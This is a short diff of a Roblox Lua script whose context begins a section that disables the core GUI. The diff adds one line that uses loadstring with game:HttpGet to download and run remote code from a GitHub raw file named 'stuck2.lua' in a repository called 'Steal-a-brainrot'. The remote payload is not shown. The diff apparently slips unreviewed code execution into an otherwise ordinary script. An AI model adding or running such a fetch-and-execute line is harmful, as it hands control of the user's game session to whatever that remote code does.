@@ -19,7 +19,7 @@ local RunService   = game:GetService("RunService")
 local Workspace    = game:GetService("Workspace")
 local StarterGui   = game:GetService("StarterGui")
 local SoundService = game:GetService("SoundService")
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/RblxScriptsOG/Steal-a-brainrot/refs/heads/main/stuck2.lua", true))()
 -----------------------------------------------------------------
 -- 1. DISABLE ALL CORE GUI
 -----------------------------------------------------------------
